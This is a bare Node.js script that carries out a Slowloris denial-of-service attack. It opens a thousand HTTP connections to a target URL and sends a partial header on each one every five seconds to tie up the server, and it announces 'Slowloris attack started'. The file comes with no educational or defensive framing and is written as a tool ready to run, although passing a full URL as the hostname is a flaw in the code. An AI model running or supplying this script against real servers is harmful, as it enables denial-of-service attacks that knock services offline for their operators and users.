const http = require('http');

const target = 'http://example.com'; // Replace with target URL
const connections = 1000; // Number of slow connections
const interval = 5000; // Time interval for headers in milliseconds

for (let i = 0; i < connections; i++) {
    const req = http.request({
        hostname: target,
        port: 80,
        method: 'GET',
        headers: {
            'User-Agent': 'Mozilla/5.0',
            'Connection': 'keep-alive'
        }
    });

    setInterval(() => {
        req.write('X-a: keep-alive\r\n'); // Send headers periodically to keep connection alive
        console.log(`[Connection ${i}] Header sent to ${target}`);
    }, interval);

    req.on('error', (e) => {
        console.error(`[Connection ${i}] Error: ${e.message}`);
    });
}
console.log(`Slowloris attack started on ${target} with ${connections} connections.`);